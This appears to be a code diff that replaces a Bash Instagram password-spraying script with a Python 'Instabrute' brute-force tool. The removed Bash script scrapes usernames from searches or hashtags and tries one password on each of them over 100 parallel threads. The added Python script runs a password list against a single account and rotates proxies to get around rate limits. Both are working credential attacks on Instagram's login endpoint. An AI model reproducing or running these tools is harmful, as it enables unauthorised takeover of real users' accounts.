@@ -1,125 +1,168 @@
 
-#!/bin/bash
-#author         : ./Lolz
-#thanks to      : JavaGhost - Bashid.org
-#recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
-#Yamaap kalau scriptnya acak"an:(
-
-#color(bold)
-red='\e[1;31m'
-green='\e[1;32m'
-yellow='\e[1;33m'
-blue='\e[1;34m'
-magenta='\e[1;35m'
-cyan='\e[1;36m'
-white='\e[1;37m'
-
-#thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
-limit=100
-
-#banner
-echo -e $'''
-                _  __       _ 
-__     | _|_ o |_)|_     o (_|
-||||_| |  |_ | |_)|  ___ | __|
-\e[1;31mcontact: https://fb.me/n00b.me\e[1;37m
 '''
-
-#dependencies
-dependencies=( "jq" "curl" )
-for i in "${dependencies[@]}"
-do
-    command -v $i >/dev/null 2>&1 || {
-        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
-        exit
-    }
-done
-
-#menu
-echo -e '''
-1]. Get target from specific \e[1;31m@username\e[1;37m
-2]. Get target from specific \e[1;31m#hashtag\e[1;37m
-3]. Crack from your target list
+TODO LIST:
+	Fix and make proxy function better
+	Sort code again
+	Add help function to all "Yes/no" questions
+	Add help  function to "Press enter to exit input"
 '''
+import requests
+import json
+import time
+import os
+import random
+import sys
 
-read -p $'What do you want   : \e[1;33m' opt
+#Help function
+def Input(text):
+	value = ''
+	if sys.version_info.major > 2:
+		value = input(text)
+	else:
+		value = raw_input(text)
+	return str(value)
 
-touch target
+#The main class
+class Instabrute():
+	def __init__(self, username, passwordsFile='pass.txt'):
+		self.username = username
+		self.CurrentProxy = ''
+		self.UsedProxys = []
+		self.passwordsFile = passwordsFile
+		
+		#Check if passwords file exists
+		self.loadPasswords()
+		#Check if username exists
+		self.IsUserExists()
 
-case $opt in
-    1) #menu 1
-        read -p $'\e[37m[\e[34m?\e[37m] Search by query   : \e[1;33m' ask
-        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
-        echo $'\e[37m[\e[34m+\e[37m] Just found        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
-        read -p $'[\e[1;34m?\e[1;37m] Password to use   : \e[1;33m' pass
-        echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
-        ;;
-    2) #menu 2
-        read -p $'\e[37m[\e[34m?\e[37m] Tags for use      : \e[1;33m' hashtag
-        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
-        if [[ $get =~ "Page Not Found" ]]; then
-        echo -e "$hashtag : ${red}Hashtag not found${white}"
-        exit
-        else
-            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
-            echo -e "${white}[${blue}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
-            echo -e "[${blue}+${white}] Just found        : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
-            read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
-            echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
-            for tag in $(cat hashtag); do
-                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
-            done
-            wait
-            rm hashtag result
-        fi
-        ;;
-    3) #menu 3
-        read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
-        if [[ ! -e $list ]]; then
-            echo -e "${red}file not found${white}"
-            exit
-            else
-                cat $list > target
-                echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
-                read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
-                echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
-        fi
-        ;;
-    *) #wrong menu
-        echo -e "${white}options are not on the menu"
-        sleep 1
-        clear
-        bash brute.sh
-esac
 
-#start_brute
-token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
-function brute(){
-    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
-                    -H "cookie: csrftoken=${token}" \
-                    -H "origin: https://www.instagram.com" \
-                    -H "referer: https://www.instagram.com/accounts/login/" \
-                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
-                    -H "x-csrftoken: ${token}" \
-                    -H "x-requested-with: XMLHttpRequest" \
-                    -d "username=${i}&password=${pass}")
-                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
-                    if [[ $login =~ "true" ]]; then
-                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
-                        elif [[ $login =~ "false" ]]; then
-                                    echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
-                            elif [[ $url =~ "checkpoint_required" ]]; then
-                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
-                    fi
-}
+		UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
+		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
+			self.randomProxy()
 
-#thread
-(
-    for i in $(cat target); do
-        ((thread=thread%limit)); ((thread++==0)) && wait
-        brute "$i" &
-    done
-    wait
-)
 
-rm target
+	#Check if password file exists and check if he contain passwords
+	def loadPasswords(self):
+		if os.path.isfile(self.passwordsFile):
+			with open(self.passwordsFile) as f:
+				self.passwords = f.read().splitlines()
+				passwordsNumber = len(self.passwords)
+				if (passwordsNumber > 0):
+					print ('[*] %s Passwords loads successfully' % passwordsNumber)
+				else:
+					print('Password file are empty, Please add passwords to it.')
+					Input('[*] Press enter to exit')
+					exit()
+		else:
+			print ('Please create passwords file named "%s"' % self.passwordsFile)
+			Input('[*] Press enter to exit')
+			exit()
+
+	#Choose random proxy from proxys file
+	def randomProxy(self):
+		plist = open('proxy.txt').read().splitlines()
+		proxy = random.choice(plist)
+
+		if not proxy in self.UsedProxys:
+			self.CurrentProxy = proxy
+			self.UsedProxys.append(proxy)
+		try:
+			print('')
+			print('[*] Check new ip...')
+			print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
+		except Exception as e:
+			print  ('[*] Can\'t reach proxy "%s"' % proxy)
+		print('')
+
+
+	#Check if username exists in instagram server
+	def IsUserExists(self):
+		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
+		if (r.status_code == 404):
+			print ('[*] User named "%s" not found' % username)
+			Input('[*] Press enter to exit')
+			exit()
+		elif (r.status_code == 200):
+			return True
+
+	#Try to login with password
+	def Login(self, password):
+		sess = requests.Session()
+
+		if len(self.CurrentProxy) > 0:
+			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }
+
+		#build requests headers
+		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
+		sess.headers.update({
+			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
+			'x-instagram-ajax':'1',
+			'X-Requested-With': 'XMLHttpRequest',
+			'origin': 'https://www.instagram.com',
+			'ContentType' : 'application/x-www-form-urlencoded',
+			'Connection': 'keep-alive',
+			'Accept': '*/*',
+			'Referer': 'https://www.instagram.com',
+			'authority': 'www.instagram.com',
+			'Host' : 'www.instagram.com',
+			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
+			'Accept-Encoding' : 'gzip, deflate'
+		})
+
+		#Update token after enter to the site
+		r = sess.get('https://www.instagram.com/') 
+		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+
+		#Update token after login to the site 
+		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
+		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+		
+		#parse response
+		data = json.loads(r.text)
+		if (data['status'] == 'fail'):
+			print (data['message'])
+
+			UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
+			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
+				print ('[$] Try to use proxy after fail.')
+				randomProxy() #Check that, may contain bugs
+			return False
+
+		#return session if password is correct 
+		if (data['authenticated'] == True):
+			return sess 
+		else:
+			return False
+
+
+
+
+
+
+instabrute = Instabrute(Input('Please enter a username: '))
+
+try:
+	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
+except Exception as e:
+	print ('[*] Error, software use the defult value "4"')
+	delayLoop = 4
+print ('')
+
+
+
+for password in instabrute.passwords:
+	sess = instabrute.Login(password)
+	if sess:
+		print ('[*] Login success %s' % [instabrute.username,password])
+	else:
+		print ('[*] Password incorrect [%s]' % password)
+
+	try:
+		time.sleep(delayLoop)
+	except KeyboardInterrupt:
+		WantToExit = str(Input('Type y/n to exit: ')).upper()
+		if (WantToExit == 'Y' or WantToExit == 'YES'):
+			exit()
+		else:
+			continue
+		
